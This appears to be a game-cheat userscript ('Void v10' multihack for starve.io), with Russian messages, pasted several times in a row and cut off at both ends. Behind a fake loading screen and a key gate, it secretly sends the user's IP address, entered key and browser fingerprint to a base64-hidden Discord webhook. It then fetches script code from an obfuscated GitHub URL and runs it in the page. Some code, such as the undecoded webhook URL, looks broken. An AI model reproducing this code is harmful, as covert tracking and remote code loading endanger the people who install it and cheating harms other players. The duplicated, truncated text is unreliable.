                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
